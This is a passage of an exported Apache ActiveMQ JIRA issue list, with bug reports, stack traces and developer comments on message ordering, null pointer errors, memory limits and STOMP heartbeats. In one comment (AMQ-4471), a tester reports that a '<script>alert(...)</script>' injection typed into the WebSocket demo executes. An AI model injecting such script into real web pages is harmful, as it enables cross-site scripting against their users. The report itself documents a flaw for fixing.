The proper fix is to ensure cursors are updated in the same order as the store.",,gtully,tmielke,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3470,AMQ-2868,,AMQ-6164,,,,,,,AMQ-4535,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,324955,,,Sat Aug 30 23:02:55 UTC 2014,,,,,,,,,,,"0|i1k2a7:",325300,,,,,,,,,,,,,,,,,,,,,"25/Apr/13 12:54;gtully;fix in http://svn.apache.org/r1475734

idea is to have a beforeCompletion in a per destination sync that is called with the store index exclusive lock. This tracks the required cursor update oder. The first afterCompletion thread that is in order executes all pending updates in the correct order. Out of order completions queue their work or see it already complete. The batch update of pending work prevents further contention/race on the queue sendlock.
We may want to introduce blocking for an ordered execution slot if multiple sync after completions have strict ordered dependencies. For the moment in the broker, after completions are only  used for cursor updates.;;;","22/Aug/13 21:37;gtully;The fix was reworked/improved for leveldb use case.;;;","15/Nov/13 12:31;gtully;There are still some gremlins in here, seems to be contention between concurrent commits with composite dests and contention with non transactional work. ;;;","18/Nov/13 15:32;gtully;fix in http://git-wip-us.apache.org/repos/asf/activemq/commit/511b60c6

non transactional work could interleave with ordered transactional work. that resulted in the cursor and index being out of sync and skipping a dispatch;;;","30/Aug/14 23:02;gtully;further rework - jdbc store showed contention was not limited to transactions but to interleaving transactional and non transactional work. Contention between the cursor fill and store scan and for kahadb concurrentStoreAndDispatch - contention with async work queue.
Fix that introduces ordered interplay between store index and destination cursor update on a per message basis:
https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=54e2e3be;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NetworkConnectors create a consumer for queue://,AMQ-4484,12644386,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,ron.koerner,ron.koerner,24/Apr/13 16:57,13/May/13 18:24,14/Jul/23 05:43,13/May/13 18:24,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"At least for duplex NetworkConnectors a consumer for queue:// is added on the remote broker, if there are no statically included destinations.

This is caused by the string ""[]"" incorrectly converted to a list with one element, instead of an empty list.

The attached patch fixes the problem.",,ron.koerner,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Apr/13 17:01;ron.koerner;StringToListOfActiveMQDestinationConverter.patch;https://issues.apache.org/jira/secure/attachment/12580308/StringToListOfActiveMQDestinationConverter.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,324753,,,Mon May 13 18:24:52 UTC 2013,,,,,,,Patch Available,,,,"0|i1k11j:",325099,,,,,,,,,,,,,,,,,,,,,"13/May/13 18:24;tabish;Fixed and test added, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NullPointerException with IndividualDeadLetterStrategy and TimeStampBrokerPlugin,AMQ-4475,12642978,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,17/Apr/13 17:25,17/Apr/13 18:07,14/Jul/23 05:43,17/Apr/13 18:07,5.8.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,"When using the IndividualDeadLetterStrategy and and the TimestampBrokerPlugin if a Message is forwarded from one Queue to another over the VM Transport you get a NullPointerException

{noformat}
We are getting the null pointer below when using TimeStampingBrokerPlugin & IndividualDeadLetterStrategy:

Caused by: java.lang.NullPointerException
	at org.apache.activemq.broker.region.policy.IndividualDeadLetterStrategy.getDeadLetterQueueFor(IndividualDeadLetterStrategy.java:44)
	at org.apache.activemq.broker.util.TimeStampingBrokerPlugin.isDestinationDLQ(TimeStampingBrokerPlugin.java:148)
	at org.apache.activemq.broker.util.TimeStampingBrokerPlugin.send(TimeStampingBrokerPlugin.java:105)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:450)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:680)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:294)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:152)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:241)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)

{noformat}",,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,323388,,,Wed Apr 17 18:07:40 UTC 2013,,,,,,,,,,,"0|i1jsmf:",323733,,,,,,,,,,,,,,,,,,,,,"17/Apr/13 18:07;tabish;Fixed on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NPE in ActiveMQXASession.getTransacted(),AMQ-4474,12642884,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,lichtin,lichtin,17/Apr/13 08:00,17/Apr/13 14:19,14/Jul/23 05:43,17/Apr/13 14:19,5.7.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"java.lang.NullPointerException
        at org.apache.activemq.ActiveMQXASession.getTransacted(ActiveMQXASession.java:72)
        at sun.reflect.GeneratedMethodAccessor91.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)[:1.7.0_13]
        at java.lang.reflect.Method.invoke(Method.java:601)[:1.7.0_13]
        at com.atomikos.jms.AtomikosJmsXaSessionProxy.invoke(AtomikosJmsXaSessionProxy.java:195)[163:com.atomikos.transactions-osgi:3.8.1]
        at sun.proxy.$Proxy44.getTransacted(Unknown Source)[163:com.atomikos.transactions-osgi:3.8.1]
        at org.springframework.jms.listener.AbstractMessageListenerContainer.commitIfNecessary(AbstractMessageListenerContainer.java:573)[104:org.springframework.jms:3.1.4.RELEASE]
        at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.doReceiveAndExecute(AbstractPollingMessageListenerContainer.java:359)[104:org.springframework.jms:3.1.4.RELEASE]
        at org.springframework.jms.listener.AbstractPollingMessageListenerContainer.receiveAndExecute(AbstractPollingMessageListenerContainer.java:244)[104:org.springframework.jms:3.1.4.RELEASE]
        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.invokeListener(DefaultMessageListenerContainer.java:1069)[104:org.springframework.jms:3.1.4.RELEASE]
        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.executeOngoingLoop(DefaultMessageListenerContainer.java:1061)[104:org.springframework.jms:3.1.4.RELEASE]
        at org.springframework.jms.listener.DefaultMessageListenerContainer$AsyncMessageListenerInvoker.run(DefaultMessageListenerContainer.java:958)[104:org.springframework.jms:3.1.4.RELEASE]
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)[:1.7.0_13]
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)[:1.7.0_13]
        at java.lang.Thread.run(Thread.java:722)[:1.7.0_13]",,lichtin,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,323297,,,Wed Apr 17 14:19:23 UTC 2013,,,,,,,,,,,"0|i1js27:",323642,,,,,,,,,,,,,,,,,,,,,"17/Apr/13 14:19;tabish;This has already been fixed in svn rev. 1454422;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
consumer.close() on transacted session does not release prefetched messages,AMQ-4472,12642778,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,jsherman1,jsherman1,16/Apr/13 17:50,16/Jul/14 20:30,14/Jul/23 05:43,26/Apr/13 15:43,5.8.0,,,,,5.9.0,,,JMS client,,,,0,transactions,,,,,,,,"When using transactions an issue can arise where the consumer has messages in it's prefetch and when consumer.close() is called the consumer is not closed and does not release the messages.  


The use case is as follows:

1) Create producer
2) Create consumer
3) Send message to queue
4) Commit session
5) Send a new message
6) Close the consumer
7) Start a new consumer
8) Try to receive the message

Test case will be attached shortly.",,gtully,jsherman1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQNET-484,,,,,,,,,,,,,,,,"16/Apr/13 18:57;jsherman1;amq-4472.zip;https://issues.apache.org/jira/secure/attachment/12578985/amq-4472.zip",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,323192,,,Fri Apr 26 15:43:10 UTC 2013,,,,,,,,,,,"0|i1jrev:",323537,,,,,,,,,,,,,,,,,,,,,"16/Apr/13 17:55;jsherman1;If you commit after the close, the test will work as expected and the first consumer is shutdown.;;;","22/Apr/13 15:22;gtully;prefetch=0 works around this. but the problem is that a new transaction is created on the session by the second send, and the close is deferred till that commits (the close registers a synchroniztion if there is a transaction).
With prefetch=0, the consumer has no pending messages so the effect of the deferred close is invisible.;;;","24/Apr/13 19:16;chirino;So using preftech=0 is just a work-around. It should also work for any preftech value.
IMO, as long as the consumer has not acked any of the prefetched messages, it should not consider itself as being part of the transaction.
;;;","26/Apr/13 15:43;gtully;fix in http://svn.apache.org/r1471673;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Inconsistent messages with the WebSocket/Stomp Demo,AMQ-4471,12642554,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,matzew,matzew,15/Apr/13 15:30,03/Jun/15 18:32,14/Jul/23 05:43,03/Jun/15 18:32,5.8.0,,,,,5.12.0,,,STOMP,Transport,,,0,,,,,,,,,"Playing with the ""demo/websocket/index.html"" demo (5.8.0), I see an inconsistent messaging behavioir


Having two browsers (FF and chrome) and not always the message receives the other browser


* TEST in FF => displayed in Chrome (and FF)
* TEST (1) in Chrome => displayed in both
* TEST (2) in Chrome => this time, only visible in Chrome; no message arrived at the Firefox browser


",,davsclaus,hadrian,matzew,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,322968,,,Wed Jun 03 18:32:01 UTC 2015,,,,,,,,,,,"0|i1jq13:",323313,,,,,,,,,,,,,,,,,,,,,"30/Oct/13 10:29;davsclaus;Can you try to see if you can reproduce in AMQ 5.9 release?;;;","30/Oct/13 10:44;matzew;sure;;;","30/Oct/13 11:14;matzew;Don't see this this error any more. However, for the shake of I tried inserting this in the input element:
{code}
<script>alert('hallo');</script>
{code}

And it works :-) ;;;","12/Mar/14 03:01;hadrian;Is this commit fixing it?
https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commitdiff;h=8a5c0528f8bcd1abca9fbecaad6b1fd1a94d0a45;;;","03/Jun/15 18:32;tabish;Tested against a 5.12-SNAPSHOT and all works as expected.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Stomp 1.0 Heartbeat does not work for stomp ssl,AMQ-4470,12642365,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,aletheia7,aletheia7,13/Apr/13 05:44,13/Apr/13 06:08,14/Jul/23 05:43,13/Apr/13 06:07,5.6.0,,,,,5.x,,,STOMP,,,,0,activemq,beat,heart,heartbeat,ssl,stomp,transport.defaultHeartBeat,transportConnector,"The Stomp 1.0 Heartbeat feature does not work for stomp+ssl or stomp+nio+ssl URIs. I created a client that sends a request-reply message every 30s with a defaultHeartBeat of 5000 (5s). The Stomp Inactivity Monitor closes the connection for plain stomp URIs. stomp+ssl URIs do not get closed.

Works:

<transportConnector name=""stomp"" uri=""stomp://0.0.0.0:61613?transport.defaultHeartBeat=5000,0""/>

Does not work:

<transportConnector name=""stomp+ssl"" uri=""stomp+ssl://0.0.0.0:61613?transport.defaultHeartBeat=5000,0""/>
<transportConnector name=""stomp+nio+ssl"" uri=""stomp+nio+ssl://0.0.0.0:61613?transport.defaultHeartBeat=5000,0""/>

","Linux: Ubuntu 12.04.1 LTS
java version ""1.7.0_09""
OpenJDK Runtime Environment (IcedTea7 2.3.3) (7u9-2.3.3-0ubuntu1~12.04.1)
OpenJDK Client VM (build 23.2-b09, mixed mode, sharing)",aletheia7,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,322779,,,Sat Apr 13 06:08:29 UTC 2013,,,,,,,,,,,"0|i1jovb:",323124,,,,,,,,,,,,,,,,,,,,,"13/Apr/13 06:07;aletheia7;Works as expected in 5.8;;;","13/Apr/13 06:08;aletheia7;Fixed in ActiveMQ 5.8;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Maximum connections control can not work in concurrent environment,AMQ-4469,12642269,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,wangyin,wangyin,12/Apr/13 16:20,12/Apr/13 23:02,14/Jul/23 05:43,12/Apr/13 23:02,5.6.0,,,,,5.9.0,,,Broker,,,,0,,,,,,,,,The test case demonstrates that you can create even more connections than the maximum size.,,ceposta,tabish,wangyin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Apr/13 16:22;wangyin;AMQ-4469.patch;https://issues.apache.org/jira/secure/attachment/12578438/AMQ-4469.patch","12/Apr/13 16:22;wangyin;MaxConnectionControlTest.java;https://issues.apache.org/jira/secure/attachment/12578437/MaxConnectionControlTest.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,322683,,,Fri Apr 12 23:02:55 UTC 2013,,,,,,,Patch Available,,,,"0|i1jo9z:",323028,,,,,,,,,,,,,,,,,,,,,"12/Apr/13 16:35;wangyin;The inner TransportAcceptListener in the TransportConnector that increases the current number of connections created by clients async will allow the TcpTransportServer to accept more connections.
The currentTransportCount property in the TcpTransportServer is non thread-safe while it will be counted by the TransportConnector in parallel.
;;;","12/Apr/13 23:02;tabish;fixed on trunk, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Memory usage percent can be exceeded much if PFC is disabled,AMQ-4467,12641980,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,wangyin,wangyin,11/Apr/13 05:44,25/May/17 11:48,14/Jul/23 05:43,10/Jan/17 11:22,5.x,,,,,5.15.0,,,Broker,,,,0,,,,,,,,,"If PFC is disabled, when the store cursor checks limits, it checks only the memory percentage of its own MemoryUsage and compares it to the high water mark. Otherwise if PFC is enabled, it checks whether the MemoryUsage is ""full"" but the ""isFull"" method also checks its parents.
This issue arrises when you have memory limits set on queues higher than the overall system limit, as well as if you have multiple queues who's memory limits combined are higher than the overall system limit. These settings must be taken into account.
The original form can be found at 
http://activemq.2283324.n4.nabble.com/What-can-be-reason-of-460-memory-usage-limit-td4665651.html",,cshannon,dejanb,gtully,jira-bot,wangyin,xabhi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4494,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-6687,"11/Apr/13 05:55;wangyin;AMQ-4467.patch;https://issues.apache.org/jira/secure/attachment/12578163/AMQ-4467.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,322394,,,Thu May 25 11:48:26 UTC 2017,,,,,,,,,,,"0|i1jmhr:",322739,,,,,,,,,,,,,,,,,,,,,"11/Apr/13 05:49;wangyin;The test case is here,http://activemq.2283324.n4.nabble.com/file/n4665800/MemoryUsageBrokerTest.java
;;;","11/Apr/13 05:55;wangyin;One simple solution is when the cursor calls the hasSpace method to see if it has space to cache messages we also check it's parent to see if it's full.
The patch is based on 5.6 codebase.;;;","30/Apr/13 11:47;dejanb;This is now fixed with svn revision 1477574. Thanks for raising the issue and providing the test case.;;;","09/Jan/17 16:26;gtully;The fix applies the cursor high water mark value to the shared system usage limit in error.
When checking if the shared or parent system usage is exhausted a value of 100% should be used while the per destination limit can be validated against the memoryUsageHighWaterMark via the perDestination percentUsage.

This becomes apparent with low values for memoryUsageHighWaterMark. With N destinations, the shared system usage can easily exceed this low per destination value and starve dispatch/pageIn for subsequent destinations.
;;;","10/Jan/17 11:18;jira-bot;Commit c76f109692749b8bf7d7cd39ed75022875c39213 in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=c76f109 ]

https://issues.apache.org/jira/browse/AMQ-4467 - modify fix check full against shared limit and high water mark against local limit, additional test
;;;","10/Jan/17 11:22;gtully;shared limit check now independent of the per destination watermark.;;;","10/Jan/17 12:48;cshannon;Good catch [~gtully].  A couple things...., First, if memory usage now properly goes up to 100% usage across all destinations instead of stopping at the high water mark (typically 70%) will that ever effect paging in for dispatch?  I'm pretty sure the pending cursors will still page in for dispatch and that the memory usage is just used for producers and not consumers but want to see if you could think of any scenarios where dispatch would stop.

Second, should Topics honor this value as well? I.e. on this line in Topic https://github.com/apache/activemq/blob/activemq-5.14.3/activemq-broker/src/main/java/org/apache/activemq/broker/region/Topic.java#L376 memory usage is checked for full but should it honor the high water mark instead?;;;","10/Jan/17 13:21;gtully;Thanks for the feedback @Christopher L], It can stop dispatch which is a little worrying alright. The reasoning is more from the intent of the linked issue: AMQ-4494, it there is no room for dispatch (due to bad configuration) then rather than OOM the vm, the limits are enforced and some in-memory messages need to be consumed before more can be paged in.
To have a better solution in this scenario - having a mechanism to purge the cache for inactive destinations would be needed. I guess gcInactiveDestinations would do it with a variant that just purged the cursor rather than deleted the messages.

Peek at the additional test - it failed due to not being able to page in at 50% ( its high water mark) of the system limit. Now it will fail at 100% of the shared limit.

Note: hasSpace is queried by the cursor prior to pageIn: https://github.com/apache/activemq/blob/activemq-5.14.3/activemq-broker/src/main/java/org/apache/activemq/broker/region/cursors/QueueStorePrefetch.java#L118

Topics use only the shared limit to gate pageIn for subscriptions.;;;","10/Jan/17 13:45;cshannon;Ah ok, I understand better now thanks for the explanation.  So the core behavior hasn't changed and now the usage just goes up to 100% if using multiple destinations.  Now that I think about it, I'm pretty sure I've seen this behavior happen where dispatch slows to a crawl down when memory usage hits the high water mark because future dispatched messages have to wait for messages to be acked as shown in your test at 50%.

Purging the cursor is an interesting idea and I think would be a nice improvement.  Clearing out the the cursor cache if the destination is inactive so other active destinations get access to all of the memory certainly seems like the ideal solution.  If I get some time I will play around with this a little bit as a feature for the 5.15 release.
;;;","25/May/17 11:44;jira-bot;Commit 25f112c5c9a843f162296ad38eb79be47183e0be in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=25f112c ]

[AMQ-6687] ensure transacted sends blocked on pfc do not resume after tx completion. AMQ-4467 refine the fix such that PFC kicks in such that the cache will accept messsages that push it over it's limit while it is still under the limit
;;;","25/May/17 11:48;gtully;With transactions or concurrentStoreAndDispatch - memory is accounted for before it reaches the cache which typically means that the cursor cache stops accepting messages early. If we want the cache and PFC we have to let the cache consume >100% of memory. To achieve this we must set the cursorHighWaterMark>100% something like 120% such that it will still allow a message to be cached while is is <100 that will put it over the 100% (full) limit.
Ie: we check is full and we are at 99%, we accept another message that pushes us to 101%, without a cursorHighWaterMark > 101 the cursor won't cache and will stick at 99% and producer flow control (PFC) won't kick in.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cannot pass parameters to ServerMojo in activemq-perf tooling because incorrect maven plugin syntax,AMQ-4466,12641848,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,ceposta,ceposta,10/Apr/13 14:46,15/May/13 16:30,14/Jul/23 05:43,10/Apr/13 14:48,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"Properties should be 
property=""property.name""

but at the moment, it's 
property=""${property.name}""

probably left over when it was expression=""${property.name}""

Similar issue to AMQ-4275 ",,ceposta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4537,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,322263,,,Wed Apr 10 14:47:47 UTC 2013,,,,,,,,,,,"0|i1jlon:",322608,,,,,,,,,,,,,,,,,,,,,"10/Apr/13 14:47;ceposta;fixed with svn r1466499;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NonBlocking redelivery redelivers messages in reverse order.,AMQ-4464,12641665,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,09/Apr/13 17:03,09/Apr/13 17:05,14/Jul/23 05:43,09/Apr/13 17:05,5.7.0,5.8.0,,,,5.9.0,,,JMS client,,,,0,,,,,,,,,Non-blocking redelivery enabled causes messages to be redelivered in reverse order.  Also the dispatched message list isn't cleared quickly enough so a short redelivery delay can cause unmatched acks to go out when the async rollback task fires.  ,,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,322081,,,Tue Apr 09 17:05:34 UTC 2013,,,,,,,,,,,"0|i1jkk7:",322426,,,,,,,,,,,,,,,,,,,,,"09/Apr/13 17:05;tabish;fixed on trunk;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
org.apache.activemq.bugs.AMQ4368Test.testENTMQ220 fails intermittently,AMQ-4463,12641463,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,kearls,kearls,08/Apr/13 21:46,08/Apr/13 22:34,14/Jul/23 05:43,08/Apr/13 22:34,,,,,,,,,Test Cases,,,,0,,,,,,,,,"This fails occasionally with the following messages because of a race condition at startup:

java.lang.AssertionError: No messages received on iteration: 0

",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Apr/13 22:28;kearls;AMQ-4463.patch;https://issues.apache.org/jira/secure/attachment/12577638/AMQ-4463.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,321879,,,Mon Apr 08 22:34:19 UTC 2013,,,,,,,Patch Available,,,,"0|i1jjbb:",322224,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"08/Apr/13 22:28;kearls;Make sure the 2 producing clients and the 1 consuming client have started before entering the for loop;  This should reduce failures, although I'm not sure it will eliminate them.;;;","08/Apr/13 22:34;tabish;patch applied, thanks;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Priority backup with mulitple brokers,AMQ-4461,12641397,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,08/Apr/13 16:52,18/Sep/13 13:40,14/Jul/23 05:43,08/Apr/13 17:00,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,There's a problem with priority backup when multiple brokers are involved. The priority url is not put on the head of the list.,,dejanb,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,321813,,,Tue May 28 11:21:45 UTC 